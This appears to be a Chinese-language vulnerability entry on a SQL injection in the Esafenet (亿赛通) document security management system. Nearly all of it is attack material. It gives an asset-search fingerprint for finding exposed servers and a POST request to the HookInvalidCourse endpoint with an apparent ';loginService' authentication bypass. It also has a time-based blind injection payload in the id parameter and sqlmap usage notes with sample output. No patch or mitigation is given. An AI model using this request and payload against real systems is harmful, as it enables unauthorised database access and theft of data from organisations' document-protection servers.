# 亿赛通电子文档安全管理系统HookInvalidCourse存在SQL注入漏洞

- **系统**：亿赛通电子文档安全管理系统　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`app.name="ESAFENET 亿赛通文档安全管理系统"`
- **请求**：`POST /CDGServer3/system/HookInvalidCourse;loginService HTTP/1.1`
- **关键头**：`Host: xx.xx.xx.xx`　`Content-Type: application/x-www-form-urlencoded`

**请求体 / payload**
```
command=DelHookInvalidCourse&id=1';WAITFOR DELAY '0:0:3'--

sqlmap
POST /CDGServer3/system/HookInvalidCourse;loginService HTTP/1.1
Host: xx.xx.xx.xx
Content-Type: application/x-www-form-urlencoded
command=DelHookInvalidCourse&id=1
注意：不能使用`--batch`参数，因响应为`404`，`sqlamp`
[CRITICAL] page not found (404)
it is not recommended to continue in this kind of cases. Do you want to quit and make sure that everything is set up properly? [Y/n] n
```

**其他**
- 亿赛通电子文档安全管理系统HookInvalidCourse存在SQL注入漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 亿赛通电子文档安全管理系统